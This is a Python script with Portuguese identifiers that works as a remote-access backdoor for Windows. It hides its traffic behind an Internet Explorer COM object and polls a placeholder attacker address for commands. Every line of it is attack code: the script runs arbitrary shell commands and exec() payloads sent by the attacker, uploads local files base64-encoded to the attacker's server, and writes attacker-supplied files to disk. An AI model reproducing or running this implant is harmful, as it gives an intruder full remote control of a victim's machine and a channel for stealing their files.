from win32com.client import Dispatch
import subprocess, time, base64

ie = Dispatch("InternetExplorer.Application") #1
ie.Visible = 1 #2
atacante = "http://IP_do_atacante:666/win10" #3

while True:
    try:
        ie.Navigate(atacante) #4
        while ie.ReadyState != 4: #5
            time.sleep(1)
        comando = ie.Document.body.innerHTML #6

        if comando == "": #7
            continue

        elif comando.startswith("time.sleep"):#8
            exec(comando) #9

        elif comando.startswith("download"):
            arquivo = comando.split()[1]
            with open(arquivo, "rb") as conteudo:
                corpoPOST = base64.b64encode(conteudo.read())
            ie.Navigate(atacante + "/download", 0, "", buffer(corpoPOST)) #10

        elif comando.startswith("upload"):
            arquivo = comando.split()[1]
            conteudo = base64.b64decode(comando.split()[2])
            with open(arquivo, "wb") as arquivoUpload:
                arquivoUpload.write(conteudo)
            corpoPOST = "Upload enviado com sucesso"
            ie.Navigate(atacante, 0, "", buffer(corpoPOST)) #11

        else:
            cmd = subprocess.Popen(comando, shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
            corpoPOST = cmd.stdout.read() + cmd.stderr.read()
            if corpoPOST == "":
                corpoPOST = "Comando executado"
            ie.Navigate(atacante, 0, "", buffer(corpoPOST)) #12

        while ie.ReadyState != 4: #13
            time.sleep(1)

    except Exception:
        time.sleep(5)